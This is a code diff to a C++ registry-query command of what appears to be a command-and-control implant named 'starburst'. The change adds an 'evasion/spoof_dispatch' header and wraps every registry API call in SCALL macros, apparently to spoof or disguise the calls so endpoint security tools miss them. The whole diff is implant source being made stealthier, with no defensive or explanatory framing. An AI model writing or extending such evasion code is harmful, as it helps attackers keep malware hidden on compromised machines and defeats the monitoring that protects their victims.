@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_REG_QUERY
 
@@ -54,7 +55,7 @@ auto declfn starburst::cmd_reg_query(
     }
 
     HKEY h_key = nullptr;
-    LSTATUS status = inst.advapi32.RegOpenKeyExA(
+    LSTATUS status = (LSTATUS)SCALL( inst, advapi32.RegOpenKeyExA,
         hive, subkey_buf, 0, KEY_READ, &h_key );
 
     if ( status != ERROR_SUCCESS ) {
@@ -66,7 +67,7 @@ auto declfn starburst::cmd_reg_query(
     // enumerate subkeys and values into output buffer
     auto output = static_cast<char*>( inst.heap_alloc( 16384 ) );
     if ( !output ) {
-        inst.advapi32.RegCloseKey( h_key );
+        SCALL( inst, advapi32.RegCloseKey, h_key );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -82,7 +83,7 @@ auto declfn starburst::cmd_reg_query(
     DWORD name_len;
     for ( DWORD i = 0; ; i++ ) {
         name_len = sizeof( name_buf );
-        status = inst.advapi32.RegEnumKeyExA(
+        status = (LSTATUS)SCALL( inst, advapi32.RegEnumKeyExA,
             h_key, i, name_buf, &name_len,
             nullptr, nullptr, nullptr, nullptr );
         if ( status != ERROR_SUCCESS ) break;
@@ -107,7 +108,7 @@ auto declfn starburst::cmd_reg_query(
         BYTE val_data[512] = { 0 };
         DWORD val_size = sizeof( val_data );
 
-        status = inst.advapi32.RegQueryValueExA(
+        status = (LSTATUS)SCALL( inst, advapi32.RegQueryValueExA,
             h_key, nullptr, nullptr, nullptr, nullptr, nullptr );
 
         // use RegEnumValueA via GetProcAddress since not in struct
@@ -121,7 +122,7 @@ auto declfn starburst::cmd_reg_query(
 
         name_len = sizeof( name_buf );
         val_size = sizeof( val_data );
-        status = pRegEnumValueA(
+        status = (LSTATUS)SCALL_PTR( inst, pRegEnumValueA,
             h_key, i, name_buf, &name_len,
             nullptr, &val_type, val_data, &val_size );
         if ( status != ERROR_SUCCESS ) break;
@@ -162,7 +163,7 @@ auto declfn starburst::cmd_reg_query(
         }
     }
 
-    inst.advapi32.RegCloseKey( h_key );
+    SCALL( inst, advapi32.RegCloseKey, h_key );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
